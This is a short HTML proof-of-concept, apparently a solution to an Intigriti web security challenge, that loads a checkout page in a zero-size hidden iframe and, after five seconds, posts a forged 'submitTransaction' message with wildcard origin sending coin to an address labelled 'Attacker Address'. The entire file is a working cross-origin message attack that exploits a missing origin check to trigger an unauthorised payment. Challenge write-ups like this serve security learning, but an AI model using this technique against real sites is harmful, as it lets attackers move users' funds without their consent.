<!DOCTYPE html>
<html lang="en">
<head>
    <title>Exploit</title>
</head>
<body>
    <!-- Iframe the checkout page with required parameters to initialize the environment -->
    <iframe id="targetFrame" 
            src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" 
            style="width:0;height:0;border:0;border:none;"></iframe>

    <script>
        const targetFrame = document.getElementById('targetFrame');
        
        // Wait for the iframe to load and for the listener to be ready
        window.onload = () => {
            setTimeout(() => {
                targetFrame.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: '1abbf7d13e29ec144eedf0ef02e297c40f', // Attacker Address
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*'); // Send to any origin since the target doesn't check
            }, 5000); 
        };
    </script>
</body>
</html>
